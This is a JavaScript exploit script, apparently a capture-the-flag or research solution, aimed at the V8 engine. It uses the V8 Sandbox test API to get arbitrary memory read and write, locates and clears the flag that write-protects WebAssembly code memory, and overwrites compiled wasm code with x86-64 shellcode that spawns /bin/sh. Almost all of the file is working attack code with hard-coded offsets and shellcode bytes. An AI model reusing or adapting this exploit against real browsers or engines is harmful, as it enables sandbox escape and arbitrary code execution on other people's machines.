/* constants */

const kBigIntSize = 8; // size of bigint

const empty_wasm_src = [0, 97, 115, 109, 1, 0, 0, 0]; // wat2wasm empty.wat
const pwn_wasm_src = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 4, 1, 2, 0, 11]; // wat2wasm pwn.wat

const kIsolateRootOffset = 0x58; // offset of isolate_root in WasmInstanceObject
const kFlagFieldOffset = 0x19a0; // offset of flag field (containing address of FLAG_trace_osr) in IsolateData
const kflagWasmWriteProtectCodeMemoryOffset = -0x17d79; // offset of FLAG_wasm_write_protect_code_memory from FLAG_trace_osr

const kJumpTableStartOffset = 0x60; // offset of jump_table_start in WasmInstanceObject
const kBackingStoreOffset = 0x1c; // offset of backing_store in JSArrayBuffer

// execve("/bin/sh", 0, 0)
const shellcode = [72, 191, 47, 98, 105, 110, 47, 115, 104, 0, 87, 72, 137, 231, 72, 49, 246, 72, 49, 210, 72, 49, 192, 176, 59, 15, 5]; // shellcode.py

/* --------- */


/* helpers */

// convert integer to hex form
function hex(i) { return `0x${i.toString(16)}`; }

/* ------- */


/* implement exploit primitives */

// get compressed address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// if value isn't provided, read bigint from addr
// if value is provided, write bigint value to addr
function rw(addr, value = NaN) {
    let view = new DataView(new Sandbox.MemoryView(addr, kBigIntSize));

    if (Number.isNaN(value)) { // read
        return view.getBigUint64(0, true);
    } else { // write
        view.setBigUint64(0, value, true);
    }
}

/* ---------------------------- */


/* escape v8 sandbox */

// get address of isolate_data_
let wasm_module = new WebAssembly.Module(new Uint8Array(empty_wasm_src));
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let isolate_data_addr = rw(wasm_instance_addr + kIsolateRootOffset);
console.log(`[+] isolate_data_addr == ${hex(isolate_data_addr)}`);

// get address of FLAG_wasm_write_protect_code_memory
let buf = new ArrayBuffer(kBigIntSize);
let buf_addr = addrof(buf);
console.log(`[+] buf_addr == ${hex(buf_addr)}`);
rw(buf_addr + kBackingStoreOffset, isolate_data_addr + BigInt(kFlagFieldOffset));
let view = new DataView(buf);
let flag_trace_osr_addr = view.getBigUint64(0, true);
console.log(`[+] flag_trace_osr_addr == ${hex(flag_trace_osr_addr)}`);
let flag_wasm_write_protect_code_memory_addr = flag_trace_osr_addr + BigInt(kflagWasmWriteProtectCodeMemoryOffset);
console.log(`[+] flag_wasm_write_protect_code_memory_addr == ${hex(flag_wasm_write_protect_code_memory_addr)}`);

// disable FLAG_wasm_write_protect_code_memory
rw(buf_addr + kBackingStoreOffset, flag_wasm_write_protect_code_memory_addr);
view.setUint8(0, 0); // overwrite with false

// get address of wasm code space
wasm_module = new WebAssembly.Module(new Uint8Array(pwn_wasm_src));
wasm_instance = new WebAssembly.Instance(wasm_module);
wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let wasm_code_space_addr = rw(wasm_instance_addr + kJumpTableStartOffset);
console.log(`[+] wasm_code_space_addr == ${hex(wasm_code_space_addr)}`);

// write shellcode to wasm code space
let shellcode_buf = new ArrayBuffer(shellcode.length);
let shellcode_buf_addr = addrof(shellcode_buf);
console.log(`[+] shellcode_buf_addr == ${hex(shellcode_buf_addr)}`);
rw(shellcode_buf_addr + kBackingStoreOffset, wasm_code_space_addr);
let shellcode_view = new DataView(shellcode_buf);
for (let i = 0; i < shellcode.length; i++) { shellcode_view.setUint8(i, shellcode[i]); }

// execute shellcode
wasm_instance.exports.main();

/* ----------------- */
